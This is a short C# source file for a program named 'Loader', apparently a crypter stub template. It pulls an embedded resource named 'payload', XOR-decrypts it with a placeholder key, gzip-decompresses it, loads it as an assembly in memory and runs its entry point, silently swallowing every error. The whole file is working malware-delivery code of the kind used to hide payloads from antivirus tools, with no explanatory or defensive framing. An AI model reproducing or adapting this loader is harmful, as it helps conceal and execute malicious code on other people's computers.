using System;
using System.Collections.Generic;
using System.Text;
using System.Reflection;
using System.IO;
using System.IO.Compression;
using System.Resources;

namespace Loader
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                ResourceManager rmManager = new ResourceManager("res", Assembly.GetExecutingAssembly());

                Assembly.Load(Decompress(XorCrypt((byte[])rmManager.GetObject("payload"), "{XOR_KEY}"))).EntryPoint.Invoke(null, args);

                rmManager.ReleaseAllResources();
            }
            catch { }
        }

        static byte[] XorCrypt(byte[] arr_bData, string strKey)
        {
            byte[] arr_bKey = UTF8Encoding.Default.GetBytes(strKey);

            for (int i = 0; i < arr_bData.Length; i++)
            {
                foreach (byte bKey in arr_bKey)
                    arr_bData[i] ^= bKey;
            }
            return arr_bData;
        }

        static byte[] Decompress(byte[] arr_bData)
        {
            using (MemoryStream msInput = new MemoryStream(arr_bData))
            {
                using (MemoryStream msOutput = new MemoryStream())
                {
                    using (GZipStream zsStream = new GZipStream(msInput, CompressionMode.Decompress))
                    {
                        int iRead = 0;
                        byte[] arr_bBuffer = new byte[8192];
                        do
                        {
                            iRead = zsStream.Read(arr_bBuffer, 0, arr_bBuffer.Length);

                            if (iRead > 0) msOutput.Write(arr_bBuffer, 0, iRead);
                        } while (iRead > 0);
                        return msOutput.ToArray();
                    }
                }
            }
        }
    }
}
